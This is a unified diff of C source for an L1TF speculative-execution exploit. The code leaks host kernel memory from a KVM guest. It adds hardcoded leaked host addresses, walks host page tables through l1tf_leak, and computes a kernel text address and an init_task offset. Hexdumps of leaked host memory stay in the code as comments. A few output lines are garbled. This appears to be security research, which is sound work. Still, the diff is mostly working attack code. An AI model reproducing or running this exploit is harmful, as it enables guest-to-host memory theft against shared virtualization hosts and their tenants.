@@ -162,10 +162,11 @@ uintptr_t leak_pte(uintptr_t base, uintptr_t pa)
 {
 	uintptr_t val;
 	do {
-		for (int i = 0; i < 5; i++)
+		for (int i = 0; i < 3; i++)
 			l1tf_leak((char *)&val, base, pa, sizeof(uintptr_t));
 		printf("leak_pte: %lx\n", val);
-	} while (!((val & 0x7ff8000000000ffbULL) == 0x63));
+	// } while (!((val & 0x7ff8000000000ffbULL) == 0x63)); // normal
+	} while (!((val & 0x3ULL) == 0x3)); // ept
 	return val;
 }
 
@@ -506,7 +507,7 @@ void reverse_host_kernel_data_structures(void)
 
 
 	// uintptr_t kvm_vcpu = *(uintptr_t *)&data[8]; // *(kvm_lapic+0x88)
-	// uintptr_t kvm_vcpu = 0xffff9352eff70e40; // *(kvm_lapic+0x88)
+	uintptr_t kvm_vcpu = 0xffff9352eff70e40; // *(kvm_lapic+0x88)
 	// printf("kvm_vcpu:\n");
 	// for (int off = 0; off <= 0xc0; off += 0x40) {
 	// 	char *data = thijs_l1tf_leak(base, kvm_vcpu-direct_map+off, 0x40);
@@ -703,8 +704,210 @@ void reverse_host_kernel_data_structures(void)
 	// leak_pte: 800000013354d063
 	//                  pte = 800000013354d063
 	//                   pa =        13354d000
-	uintptr_t kvm_pa = 0x13354d000;
+	// uintptr_t kvm_pa = 0x13354d000;
 
+
+	// char struct_kvm[0x100];
+	// for (int i = 0; i < 11; i++) {
+	// 	printf("struct_kvm+0x1178 - 0x80:\n");
+	// 	l1tf_leak(struct_kvm, base, kvm_pa+0x1178 - 0x80, sizeof(struct_kvm));
+	// 	display(struct_kvm, sizeof(struct_kvm));
+	// }
+	// char struct_kvm[0x200];
+	// for (int i = 0; i < 100; i++) {
+	// 	printf("struct_kvm+0x8b8 - 0x100: (i = %d)\n", i);
+	// 	l1tf_leak(struct_kvm, base, kvm_pa+0x1178 - 0x100, sizeof(struct_kvm));
+	// 	display(struct_kvm, sizeof(struct_kvm));
+	// }
+
+
+	uintptr_t mmu = kvm_vcpu - direct_map + 0x120 + 0x168;
+	dump(mmu);
+	// char struct_mmu[0x80];
+	// for (int i = 0; i < 100; i++) {
+	// 	printf("mmu - 0x40: (i = %d)\n", i);
+	// 	l1tf_leak(struct_mmu, base, mmu - 0x40, sizeof(struct_mmu));
+	// 	display(struct_mmu, sizeof(struct_mmu));
+	// }
+	// mmu - 0x40: (i = 10)
+	//    0:                 0   00 00 00 00 00 00 00 00 ........
+	//    8:                 0   00 00 00 00 00 00 00 00 ........
+	//   10:                 0   00 00 00 00 00 00 00 00 ........
+	//   18:                 1   01 00 00 00 00 00 00 00 ........
+	//   20:             30000   00 00 03 00 00 00 00 00 ........
+	//   28:                 0   00 00 00 00 00 00 00 00 ........
+	//   30:           1000000   00 00 00 01 00 00 00 00 ........
+	//   38:                 0   00 00 00 00 00 00 00 00 ........
+	//   40:  ffffffff00000000   00 00 00 00 ff ff ff ff ........
+	//   48:           400004c   4c 00 00 04 00 00 00 00 L.......
+	//   50:              2005   05 20 00 00 00 00 00 00 . ......
+	//   58:  ffff9352eff710e8   e8 10 f7 ef 52 93 ff ff ....R... <-- here is mmu; it points to +8, i.e. to root_mmu
+	//   60:  ffffffff837a4860   60 48 7a 83 ff ff ff ff `Hz..... <-- start of root_mmu
+	//   68:  ffffffff837a4890   90 48 7a 83 ff ff ff ff .Hz.....
+	//   70:  ffffffff83796fb0   b0 6f 79 83 ff ff ff ff .oy.....
+	//   78:  ffffffff8375dee0   e0 de 75 83 ff ff ff ff ..u.....
+
+	// uintptr_t root_mmu = 0xffff9352eff710e8 - direct_map; // == mmu + 8
+	// dump(root_mmu);
+	// char struct_root_mmu[0x30];
+	// for (int i = 0; i < 100; i++) {
+	// 	printf("struct_root_mmu+0x20: (i = %d)\n", i);
+	// 	l1tf_leak(struct_root_mmu, base, root_mmu+0x20, sizeof(struct_root_mmu));
+	// 	display(struct_root_mmu, sizeof(struct_root_mmu));
+	// }
+	// printf("\n");
+	// struct_root_mmu+0x20: (i = 5)
+	//    0:  ffffffff837a04e0   e0 04 7a 83 ff ff ff ff ..z.....
+	//    8:  ffffffff837a4b60   60 4b 7a 83 ff ff ff ff `Kz.....
+	//   10:  ffffffff837a01c0   c0 01 7a 83 ff ff ff ff ..z.....
+	//   18:                 0   00 00 00 00 00 00 00 00 ........
+	//   20:                 0   00 00 00 00 00 00 00 00 ........
+	//   28:         f77f64000   00 40 f6 77 0f 00 00 00 .@.w....
+	uintptr_t hpa = 0xf77f64000; // *(root_mmu + 0x48);
+
+
+	// void *p = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
+	// assert(p != MAP_FAILED);
+	// memset(p, 0x97, 0x1000);
+	// uintptr_t p_va = (uintptr_t)p;
+	// uintptr_t p_pa = procfs_get_physaddr(p_va);
+	// uintptr_t p_hpa = leak_translation(base, hpa, p_pa);
+	// dump(p_va);
+	// dump(p_pa);
+	// dump(p_hpa);
+	// char mydata[8];
+	// for (int i = 0; i < 3; i++) {
+	// 	l1tf_leak(mydata, base, p_hpa, sizeof(mydata));
+	// 	display(mydata, sizeof(mydata));
+	// }
+	// memset(p, 0x79, 0x1000);
+	// // Careful here: the l1tf code will have cached the 0x97 results in its hc_map.
+	// // Do enough re-measurements to overrule the earlier data.
+	// for (int i = 0; i < 10; i++)
+	// 	l1tf_leak(mydata, base, p_hpa, sizeof(mydata));
+	// display(mydata, sizeof(mydata));
+	// printf("\n");
+
+
+	// uintptr_t cr3 = kvm_vcpu-direct_map + 0x120 + 0xa0; // vcpu->arch.cr3
+	// dump(cr3);
+	// char around_cr3[0x40];
+	// for (int i = 0; i < 100; i++) {
+	// 	printf("cr3-0x20: (i = %d)\n", i);
+	// 	l1tf_leak(around_cr3, base, cr3-0x20, sizeof(around_cr3));
+	// 	display(around_cr3, sizeof(around_cr3));
+	// }
+	// printf("\n");
+	// cr3-0x20: (i = 68)
+	//    0:     47da54bf494b3   b3 94 f4 4b a5 7d 04 00 ...K.}..
+	//    8:  ffff74e54bf39e49   49 9e f3 4b e5 74 ff ff I..K.t..
+	//   10:  ffffffffb8345676   76 56 34 b8 ff ff ff ff vV4.....
+	//   18:     10000ff21ffef   ef ff 21 ff 00 00 01 00 ..!.....
+	//   20:          80050033   33 00 05 80 00 00 00 00 3.......
+	//   28:                 8   08 00 00 00 00 00 00 00 ........
+	//   30:      70054c03901f   1f 90 03 4c 05 70 00 00 ...L.p..
+	//   38:         1961c6001   01 60 1c 96 01 00 00 00 .`...... <-- cr3
+	// uintptr_t cr3 = 0x1961c6001; // kvm_vcpu-direct_map + 0x120 + 0xb8;
+	
+	// uintptr_t cr3_pa = kvm_vcpu-direct_map + 0x120 + 0xb8; // vcpu->arch.cr3
+	// dump(cr3_pa);
+	// uintptr_t cr3;
+	// for (int i = 0; i < 100; i++) {
+	// 	printf("cr3_pa | %lx: (i = %d)\n", cr3_pa, i);
+	// 	l1tf_leak((char *)&cr3, base, cr3_pa, sizeof(cr3));
+	// 	display((char *)&cr3, sizeof(cr3));
+	// }
+	// printf("\n");
+	uintptr_t cr3 = 0x10c000006; // kvm_vcpu-direct_map + 0x120 + 0xb8;
+	cr3 &= PFN_MASK;
+
+	uintptr_t cr3_hpa = 0x2b88000000; // leak_translation(base, hpa, cr3);
+	dump(cr3_hpa);
+	
+	// char l0_end[0x40];
+	// for (int i = 0; i < 100; i++) {
+	// 	printf("l0_end: (i = %d)\n", i);
+	// 	l1tf_leak(l0_end, base, cr3_hpa+0x1000-sizeof(l0_end), sizeof(l0_end));
+	// 	display(l0_end, sizeof(l0_end));
+	// }
+	// printf("\n");
+	// l0_end: (i = 3)
+	//    0:                 0   00 00 00 00 00 00 00 00 ........
+	//    8:                 0   00 00 00 00 00 00 00 00 ........
+	//   10:                 0   00 00 00 00 00 00 00 00 ........
+	//   18:                 0   00 00 00 00 00 00 00 00 ........
+	//   20:         21ffca067   67 a0 fc 1f 02 00 00 00 g.......
+	//   28:                 0   00 00 00 00 00 00 00 00 ........
+	//   30:         20cddb067   67 b0 dd 0c 02 00 00 00 g....... <-- hpa 17a7bdb000
+	//   38:         20c445067   67 50 44 0c 02 00 00 00 gPD..... <-- hpa 2dcb645000
+
+
+	uintptr_t l1 = 0x20c445067 & PFN_MASK; //0x20cddb067 & PFN_MASK;
+	uintptr_t l1_hpa = 0x2dcb645000; // leak_translation(base, hpa, l1); // 0x17a7bdb000
+	// char buf;
+	// for (int off = 0; off < 0x1000; off += 8) {
+	// 	l1tf_leak(&buf, base, l1_hpa+off, 1);
+	// 	if (buf)
+	// 		printf("at +%x, i.e. %lx we have buf = %02x\n", off, l1_hpa+off, buf);
+	// }
+	// at +%[x, i.e. 460 we have buf = a7bdb460 
+	// at +%[x, i.e. 470 we have buf = a7bdb470
+	// at +%[x, i.e. 478 we have buf = a7bdb478
+
+	// at +ff0, i.e. 2dcb645ff0 we have buf = 63
+	// at +ff8, i.e. 2dcb645ff8 we have buf = 67
+
+	// char l1_end[0x10];
+	// for (int i = 0; i < 100; i++) {
+	// 	printf("l1_end: (i = %d)\n", i);
+	// 	l1tf_leak(l1_end, base, l1_hpa+0x1000-sizeof(l1_end), sizeof(l1_end));
+	// 	display(l1_end, sizeof(l1_end));
+	// }
+	// printf("\n");
+	// l1_end: (i = 0)
+	//    0:         20c446063   63 60 44 0c 02 00 00 00 c`D..... <-- hpa 2dcb646000
+	//    8:         20c447067   67 70 44 0c 02 00 00 00 gpD.....
+	// uintptr_t l2 = 0x20c446063 & PFN_MASK;
+	uintptr_t l2_hpa = 0x2dcb646000; //leak_translation(base, hpa, l2);
+	dump(l2_hpa);
+
+	char buf;
+	for (int off = 0x27 * 8; off < 0x32*8; off += 8) {
+		l1tf_leak(&buf, base, l2_hpa+off, 1);
+		if (buf)
+			printf("idx = %x | off = +%x, i.e. hpa %lx we have buf = %02x\n", off/8, off, l2_hpa+off, (uint8_t)buf);
+	}
+	// idx = 1c1 | off = +e08, i.e. hpa 2dcb646e08 we have buf = a1
+	// idx = 1c2 | off = +e10, i.e. hpa 2dcb646e10 we have buf = a1
+	// idx = 1c3 | off = +e18, i.e. hpa 2dcb646e18 we have buf = a1
+	// idx = 1c4 | off = +e20, i.e. hpa 2dcb646e20 we have buf = a1
+	// idx = 1c5 | off = +e28, i.e. hpa 2dcb646e28 we have buf = a1
+	// idx = 1c6 | off = +e30, i.e. hpa 2dcb646e30 we have buf = a1
+	// idx = 1c7 | off = +e38, i.e. hpa 2dcb646e38 we have buf = a1
+	// idx = 1c8 | off = +e40, i.e. hpa 2dcb646e40 we have buf = a1
+	// idx = 1c9 | off = +e48, i.e. hpa 2dcb646e48 we have buf = a1
+	// idx = 1ca | off = +e50, i.e. hpa 2dcb646e50 we have buf = a1
+	// idx = 1cb | off = +e58, i.e. hpa 2dcb646e58 we have buf = a1
+	// idx = 1cc | off = +e60, i.e. hpa 2dcb646e60 we have buf = a1
+	// idx = 1cd | off = +e68, i.e. hpa 2dcb646e68 we have buf = a1
+	// idx = 1ce | off = +e70, i.e. hpa 2dcb646e70 we have buf = a1
+	// idx = 1cf | off = +e78, i.e. hpa 2dcb646e78 we have buf = a1
+	// idx = 1d0 | off = +e80, i.e. hpa 2dcb646e80 we have buf = 63
+	// idx = 1d1 | off = +e88, i.e. hpa 2dcb646e88 we have buf = e3
+	// idx = 1d2 | off = +e90, i.e. hpa 2dcb646e90 we have buf = e3
+	// idx = 1d3 | off = +e98, i.e. hpa 2dcb646e98 we have buf = 63
+	// idx = 1d4 | off = +ea0, i.e. hpa 2dcb646ea0 we have buf = 62
+	// idx = 1d5 | off = +ea8, i.e. hpa 2dcb646eapyth8 we have buf = 63
+	// idx = 1d6 | off = +eb0, i.e. hpa 2dcb646eb0 we have buf = e3
+	// idx = 1d7 | off = +eb8, i.e. hpa 2dcb646eb8 we have buf = e3
+	// idx = 1d8 | off = +ec0, i.e. hpa 2dcb646ec0 we have buf = 63
+	// idx = 1d9 | off = +ec8, i.e. hpa 2dcb646ec8 we have buf = e3
+
+	uintptr_t text = (0xffffULL << 48) | (0x1ffULL << 39) | (0x1feULL << 30) | (0x1c1ULL << 21);
+	dump(text);
+
+	#define OFF_INIT_TASK 0x2011f80
+	
 
 // =============================================================================
 
